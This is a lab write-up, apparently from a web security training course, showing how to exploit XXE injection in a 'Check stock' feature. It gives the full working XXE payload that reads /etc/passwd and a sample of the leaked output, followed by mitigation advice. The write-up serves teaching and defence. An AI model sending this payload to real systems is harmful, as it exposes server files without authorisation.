# Lab: Exploiting XXE using external entities to retrieve files

This lab contains a vulnerable “Check stock” feature that processes XML input. The goal is to exploit XXE (XML External Entity) injection to read sensitive server-side files, specifically `/etc/passwd`.

## Objective

Exploit the XML parser to retrieve and display the contents of the `/etc/passwd` file via XXE injection.

## Steps to Reproduce

1. Go to any product page and click on the "Check stock" button.
2. Intercept the POST request using Burp Suite.
3. Modify the XML data in the request body to include an external entity declaration:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>

4. Forward the request.
5. The response will show content from the /etc/passwd file, such as:
Invalid product ID: root:x:0:0:root:/root:/bin/bash

## Payload Used

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

Used inside the full request body:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>

## Key Takeaways

- XXE vulnerabilities allow attackers to read local files from the server, perform SSRF, or cause DoS.
- These attacks exploit insecure XML parsers that allow external entity resolution through DTDs.
- Always test features that handle XML input by intercepting and modifying the request.

## Mitigation

- Disable external entities and DTD processing in XML parsers.
- Use secure XML libraries:
  - Python: defusedxml
  - Java: Disable DTDs using XML parser configuration (e.g., DocumentBuilderFactory).
- Avoid accepting raw XML from untrusted sources.
- Validate and sanitize user input strictly.

